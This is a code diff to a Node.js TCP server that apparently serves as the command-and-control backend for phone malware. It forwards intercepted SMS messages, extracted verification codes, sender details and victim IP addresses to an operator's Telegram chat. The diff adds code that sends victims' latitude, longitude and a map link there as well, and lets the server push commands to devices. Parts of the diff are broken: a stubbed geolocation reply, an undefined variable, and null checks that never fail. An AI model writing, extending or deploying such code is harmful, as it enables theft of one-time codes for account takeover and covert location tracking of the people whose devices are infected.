@@ -306,11 +306,13 @@ const sendToast = async (portname, passname, devid, toast, shortcut, callback = 
 }
 
 const getGeoLocation = async (portname, passname, devid, shortcut, callback = () => {}) => {
-    await getSafeUserByDeviceId(portname, devid, async (user) => {
+    await getSafeUserByDeviceId(portname, passname, devid, async (user) => {
         let found = null;
         if (user.status == true){
             found = user.user;
         }
+
+        console.log(found)
 
         if (found == null){
             callback({
@@ -328,39 +330,47 @@ const getGeoLocation = async (portname, passname, devid, shortcut, callback = ()
             password: passname,
             method: "getGeoLocation"
         }));
-        found.socket.on("data", async (data) => {
-            let _message = JSON.parse(data.toString());
-            if (_message.method == "getGeoLocation"){
-                if (_message.port == portname && _message.password == passname){
-                    if (_message.status == true){
-                        callback({
-                            status: true,
-                            method: "getGeoLocation",
-                            longitude: _message.longitude,
-                            latitude: _message.latitude,
-                            device_id: devid,
-                            shortcut: shortcut
-                        });
-                        return;
-                    } else {
-                        callback({
-                            status: false,
-                            method: "getGeoLocation",
-                            device_id: devid,
-                            shortcut: shortcut
-                        });
-                        return;
-                    }
-                } else {
-                    user.socket.write(JSON.stringify({
-                        status: false,
-                        method: _message.method,
-                        message: "INVALID_PORT_OR_PASSWORD",
-                        device_id: devid
-                    }));
-                }
-            }
-        })
+        callback({
+                status: true,
+                method: "getGeoLocation",
+                message: "USER_NOT_FOUND",
+                device_id: devid,
+                shortcut: shortcut
+            });
+        return;
+        // found.socket.on("data", async (data) => {
+        //     let _message = JSON.parse(data.toString());
+        //     if (_message.method == "getGeoLocation"){
+        //         if (_message.port == portname && _message.password == passname){
+        //             if (_message.status == true){
+        //                 callback({
+        //                     status: true,
+        //                     method: "getGeoLocation",
+        //                     longitude: _message.longitude,
+        //                     latitude: _message.latitude,
+        //                     device_id: devid,
+        //                     shortcut: shortcut
+        //                 });
+        //                 return;
+        //             } else {
+        //                 callback({
+        //                     status: false,
+        //                     method: "getGeoLocation",
+        //                     device_id: devid,
+        //                     shortcut: shortcut
+        //                 });
+        //                 return;
+        //             }
+        //         } else {
+        //             user.socket.write(JSON.stringify({
+        //                 status: false,
+        //                 method: _message.method,
+        //                 message: "INVALID_PORT_OR_PASSWORD",
+        //                 device_id: devid
+        //             }));
+        //         }
+        //     }
+        // })
     })
 }
 
@@ -533,6 +543,7 @@ const server = net.createServer(async (socket) => {
     socket.on('data', async (data) => {
         try{
             let message = JSON.parse(data.toString());
+            console.log(message)
             if (Object.keys(message).includes("mask")){
                 if (message.mask == "metro"){
                     if (Object.keys(message).includes("port") && Object.keys(message).includes("password")){
@@ -571,6 +582,8 @@ const server = net.createServer(async (socket) => {
                                 })
                             }
 
+                            let bot = new TelegramBot(_port.port.token);
+
                             if (message.method == "openUrl"){
                                 await openUrl(message.port, message.password, message.device_id, message.url, message.shortcut, async (dt) => {
                                     socket.write(JSON.stringify(dt));
@@ -591,7 +604,7 @@ const server = net.createServer(async (socket) => {
 
                             if (message.method == "getGeoLocation"){
                                 await getGeoLocation(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
-                                    socket.write(JSON.stringify(dt));
+                                    console.log(dt);
                                 })
                             }
 
@@ -658,12 +671,88 @@ const server = net.createServer(async (socket) => {
                             let codes = extractCodes(message.sms);
                             await cli.sendMessage(
                                 prt.port.chat_id,
-                                build(`📪 𓏺|𓏺 new message received\n👤 𓏺|𓏺 `) + `${message.name !== undefined || message.name !== null ? message.name : build("unknown")} { ${message.phone_number !== undefined || message.phone_number !== null ? message.phone_number : build("no phone")} }` + (codes !== "" ? build(`\n💠 𓏺|𓏺 codes: ${codes}`) : "") + build("\n📀 𓏺|𓏺 message:") + "\n\n" + message.sms + "\n\n" + build(`🌐 𓏺|𓏺 ip: `) + message.ip,
+                                build(`📪 𓏺|𓏺 new message received\n👤 𓏺|𓏺 `) + `${message.name !== undefined || message.name !== null ? message.name : build("unknown")} { ${message.phone_number !== undefined || message.phone_number !== null ? message.phone_number : build("no phone")} }` + (codes !== "" ? build(`\n💠 𓏺|𓏺 codes: `) + codes : "") + build("\n📀 𓏺|𓏺 message:") + "\n\n" + message.sms + "\n\n" + build(`🌐 𓏺|𓏺 ip: `) + message.ip,
                                 {
                                     parse_mode: "HTML"
                                 }
                             )
-                        }                        
+                        } else if (message.method == "getGeoLocation"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🗺 ${sym} location detected\n🛰 ${sym} latitude & longitude : `) +  `<code>${message.latitude},${message.longitude}</code>` + build(`\n🔬 ${sym} check on `) + `<a href="https://www.google.com/maps/@${message.latitude},${message.longitude},15z">${build("google-map")}</a>`,
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🗺 ${sym} location detected\n🛰 ${sym} latitude & longitude : `) +  `<code>${message.latitude},${message.longitude}</code>` + build(`\n🔬 ${sym} check on `) + `<a href="https://www.google.com/maps/@${message.latitude},${message.longitude},15z">${build("google-map")}</a>`,
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            } else {
+                                if (message.message == "USER_NOT_FOUND"){
+                                    message.edit == false ? await bot.sendMessage(
+                                        message.shortcut.chat_id,
+                                        build("🔴 𓏺|𓏺 user not found"),
+                                        {
+                                            reply_to_message_id: message.shortcut.message_id
+                                        }
+                                    ) : await bot.editMessageText(
+                                        build("🔴 𓏺|𓏺 user not found"),
+                                        {
+                                            chat_id: message.shortcut.chat_id,
+                                            message_id: message.shortcut.message_id
+                                        }
+                                    )
+                                } else if (message.message == "INVALID_PORT_OR_PASSWORD"){
+                                    message.edit == false ? await bot.sendMessage(
+                                        message.shortcut.chat_id,
+                                        build("🔴 𓏺|𓏺 invalid port or password detected"),
+                                        {
+                                            reply_to_message_id: message.shortcut.message_id
+                                        }
+                                    ) : await bot.editMessageText(
+                                        build("🔴 𓏺|𓏺 invalid port or password detected"),
+                                        {
+                                            chat_id: message.shortcut.chat_id,
+                                            message_id: message.shortcut.message_id
+                                        }
+                                    )
+                                } else if (message.message == "YOU_BANNED"){
+                                    message.edit == false ? await bot.sendMessage(
+                                        message.shortcut.chat_id,
+                                        build("🔴 𓏺|𓏺 sorry but you got banned"),
+                                        {
+                                            reply_to_message_id: message.shortcut.message_id
+                                        }
+                                    ) : await bot.editMessageText(
+                                        build("🔴 𓏺|𓏺 sorry but you got banned"),
+                                        {
+                                            chat_id: message.shortcut.chat_id,
+                                            message_id: message.shortcut.message_id
+                                        }
+                                    )
+                                } else {
+                                    console.log(_message);
+                                    message.edit == false ? await bot.sendMessage(
+                                        message.shortcut.chat_id,
+                                        build("🔴 𓏺|𓏺 unkown error detected !"),
+                                        {
+                                            reply_to_message_id: message.shortcut.message_id
+                                        }
+                                    ) : await bot.editMessageText(
+                                        build("🔴 𓏺|𓏺 unkown error detected ! maybe process didnt successful"),
+                                        {
+                                            chat_id: message.shortcut.chat_id,
+                                            message_id: message.shortcut.message_id
+                                        }
+                                    )
+                                }
+                            }
+                        }
                     } else {
                         socket.write(JSON.stringify({
                             status: false,
